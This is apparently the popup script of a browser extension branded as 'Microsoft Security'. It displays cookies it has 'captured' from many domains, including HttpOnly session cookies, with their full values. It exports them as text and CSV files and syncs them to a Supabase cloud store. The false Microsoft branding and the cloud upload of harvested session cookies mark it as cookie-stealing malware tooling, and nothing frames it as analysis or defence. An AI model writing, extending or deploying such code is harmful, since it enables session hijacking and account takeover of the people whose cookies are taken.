// Microsoft Security - Cookie List Manager with Cloud Sync
// Shows all captured cookies and syncs with Supabase cloud

const STORAGE_KEY = 'ms_cookies_list';
let allCookies = [];
let cloudConnected = false;

const cookieList = document.getElementById('cookieList');
const loadingState = document.getElementById('loadingState');
const emptyState = document.getElementById('emptyState');
const countBadge = document.getElementById('countBadge');
const countLabel = document.getElementById('countLabel');
const searchInput = document.getElementById('searchInput');
const downloadBtn = document.getElementById('downloadBtn');
const refreshBtn = document.getElementById('refreshBtn');
const clearBtn = document.getElementById('clearBtn');
const toastEl = document.getElementById('toast');
const cloudDot = document.getElementById('cloudDot');
const cloudText = document.getElementById('cloudText');
const syncBtn = document.getElementById('syncBtn');

document.addEventListener('DOMContentLoaded', () => {
  loadCookies();
  checkCloudConnection();
});

refreshBtn.addEventListener('click', () => {
  refreshBtn.style.transform = 'rotate(360deg)';
  refreshBtn.style.transition = 'transform 0.4s';
  loadCookies();
  checkCloudConnection();
  setTimeout(() => { refreshBtn.style.transition = 'none'; refreshBtn.style.transform = 'rotate(0deg)'; }, 400);
  showToast('Refreshed!');
});

syncBtn.addEventListener('click', syncWithCloud);

clearBtn.addEventListener('click', async () => {
  if (!confirm('Clear all saved cookies from local AND cloud?')) return;
  await chrome.storage.local.remove(STORAGE_KEY);
  allCookies = [];
  renderCookies([]);
  updateCount(0);

  // Also clear cloud
  try {
    await MS_CLOUD.clear();
    showToast('Cleared locally & from cloud');
  } catch {
    showToast('Cleared locally only');
  }
});

downloadBtn.addEventListener('click', downloadAsList);

searchInput.addEventListener('input', (e) => {
  const q = e.target.value.toLowerCase();
  if (!q) {
    renderCookies(allCookies);
    updateCount(allCookies.length);
    return;
  }
  const filtered = allCookies.filter(c =>
    c.name.toLowerCase().includes(q) ||
    c.domain.toLowerCase().includes(q) ||
    c.value.toLowerCase().includes(q)
  );
  renderCookies(filtered);
  updateCount(filtered.length);
});

// ---- Cloud Connection ----

async function checkCloudConnection() {
  setCloudStatus('off', 'Connecting...');
  try {
    const result = await chrome.runtime.sendMessage({ action: 'cloudCheck' });
    if (result && result.connected) {
      cloudConnected = true;
      setCloudStatus('on', 'Cloud connected — cookies auto-sync');
    } else {
      cloudConnected = false;
      setCloudStatus('off', `Cloud unavailable (${result?.status || 'error'})`);
    }
  } catch (err) {
    cloudConnected = false;
    setCloudStatus('off', 'Cloud not reachable');
  }
}

async function syncWithCloud() {
  setCloudStatus('syncing', 'Syncing with cloud...');
  try {
    const result = await chrome.runtime.sendMessage({ action: 'cloudSync' });
    if (result && result.success) {
      showToast(`Synced! ${result.count} cookies`);
      await loadCookies(true); // silent reload
      checkCloudConnection();
    } else {
      setCloudStatus('off', 'Sync failed');
      showToast('Sync failed');
    }
  } catch (err) {
    setCloudStatus('off', 'Sync error');
    showToast('Sync error: ' + err.message);
  }
}

function setCloudStatus(state, text) {
  cloudDot.className = 'dot ' + state;
  cloudText.textContent = text;
}

// ---- Cookie Loading ----

async function loadCookies(silent) {
  if (!silent) {
    loadingState.style.display = 'block';
    emptyState.style.display = 'none';
    cookieList.innerHTML = '';
    cookieList.appendChild(loadingState);
  }

  try {
    const result = await chrome.storage.local.get(STORAGE_KEY);
    allCookies = result[STORAGE_KEY] || [];
    allCookies.sort((a, b) => b.timestamp - a.timestamp);

    if (silent) {
      renderCookies(allCookies);
      updateCount(allCookies.length);
      return;
    }

    loadingState.style.display = 'none';
    updateCount(allCookies.length);
    renderCookies(allCookies);

    if (allCookies.length === 0) {
      emptyState.style.display = 'block';
    }
  } catch (err) {
    if (!silent) {
      loadingState.style.display = 'none';
      emptyState.style.display = 'block';
      emptyState.innerHTML = `<h3>Error</h3><p>${err.message}</p>`;
    }
  }
}

function updateCount(n) {
  countBadge.textContent = `${n} cookie${n !== 1 ? 's' : ''}`;
  countLabel.textContent = n;
}

function renderCookies(cookies) {
  const items = cookieList.querySelectorAll('.cookie-item');
  items.forEach(el => el.remove());

  if (cookies.length === 0) {
    emptyState.style.display = 'block';
    return;
  }

  for (const c of cookies) {
    const div = document.createElement('div');
    div.className = 'cookie-item';

    let tags = '';
    if (!c.expiry || c.expiry === 'Session') tags += '<span class="tag tag-session">Session</span> ';
    if (c.secure === 'Yes') tags += '<span class="tag tag-secure">Secure</span> ';
    if (c.httpOnly === 'Yes') tags += '<span class="tag tag-http">HttpOnly</span> ';

    div.innerHTML = `
      <div class="domain">${escapeHtml(c.domain)}</div>
      <div class="name">${escapeHtml(c.name)}</div>
      <div class="value">${escapeHtml(c.value)}</div>
      <div class="meta">
        <span>${c.captured}</span>
        <span>${tags}</span>
      </div>
    `;

    cookieList.appendChild(div);
  }
}

function escapeHtml(str) {
  if (!str) return '';
  return String(str).replace(/[&<>"']/g, function(m) {
    if (m === '&') return '&amp;';
    if (m === '<') return '&lt;';
    if (m === '>') return '&gt;';
    if (m === '"') return '&quot;';
    return '&#39;';
  });
}

// ---- Download ----

function downloadAsList() {
  if (allCookies.length === 0) {
    showToast('No cookies to download');
    return;
  }

  const timestamp = new Date().toISOString().replace(/[:.]/g, '-').slice(0, 19);

  let text = '========================================\n';
  text += '  MICROSOFT SECURITY - COOKIE LIST\n';
  text += `  Exported: ${new Date().toLocaleString()}\n`;
  text += `  Total Cookies: ${allCookies.length}\n`;
  text += '========================================\n\n';

  const grouped = {};
  for (const c of allCookies) {
    if (!grouped[c.domain]) grouped[c.domain] = [];
    grouped[c.domain].push(c);
  }

  const domains = Object.keys(grouped).sort();
  let idx = 1;
  for (const domain of domains) {
    text += `─── [${domain}] ───────────────────────────────\n`;
    text += `   URL: ${grouped[domain][0].url}\n`;
    text += `   Captured: ${grouped[domain][0].captured}\n\n`;

    for (const c of grouped[domain]) {
      const flags = [];
      if (c.secure === 'Yes') flags.push('Secure');
      if (c.httpOnly === 'Yes') flags.push('HttpOnly');
      const flagStr = flags.length ? ` [${flags.join(', ')}]` : '';

      text += `  ${idx}. ${c.name}\n`;
      text += `     Value: ${c.value}\n`;
      text += `     Path: ${c.path}${flagStr}\n\n`;
      idx++;
    }
  }

  text += '========================================\n';
  text += `  End of list — ${allCookies.length} total cookies\n`;
  text += '========================================\n';

  let csv = 'Domain,URL,Cookie Name,Cookie Value,Path,Secure,HttpOnly,SameSite,Expiry,Captured\n';
  for (const c of allCookies) {
    csv += `${csvEscape(c.domain)},${csvEscape(c.url)},${csvEscape(c.name)},${csvEscape(c.value)},${csvEscape(c.path)},${c.secure},${c.httpOnly},${c.sameSite},${csvEscape(c.expiry || 'Session')},${csvEscape(c.captured)}\n`;
  }

  const txtBlob = new Blob([text], { type: 'text/plain;charset=utf-8' });
  const txtUrl = URL.createObjectURL(txtBlob);
  const a = document.createElement('a');
  a.href = txtUrl;
  a.download = `MS-Security_Cookies_${timestamp}.txt`;
  a.click();
  URL.revokeObjectURL(txtUrl);

  setTimeout(() => {
    const csvBlob = new Blob([csv], { type: 'text/csv;charset=utf-8' });
    const csvUrl = URL.createObjectURL(csvBlob);
    const a2 = document.createElement('a');
    a2.href = csvUrl;
    a2.download = `MS-Security_Cookies_${timestamp}.csv`;
    a2.click();
    URL.revokeObjectURL(csvUrl);
  }, 400);

  showToast(`Downloaded ${allCookies.length} cookies as list!`);
}

function csvEscape(str) {
  if (!str) return '';
  const s = String(str);
  if (s.includes(',') || s.includes('"') || s.includes('\n')) {
    return '"' + s.replace(/"/g, '""') + '"';
  }
  return s;
}

function showToast(msg) {
  toastEl.textContent = msg;
  toastEl.classList.add('show');
  setTimeout(() => toastEl.classList.remove('show'), 2000);
}
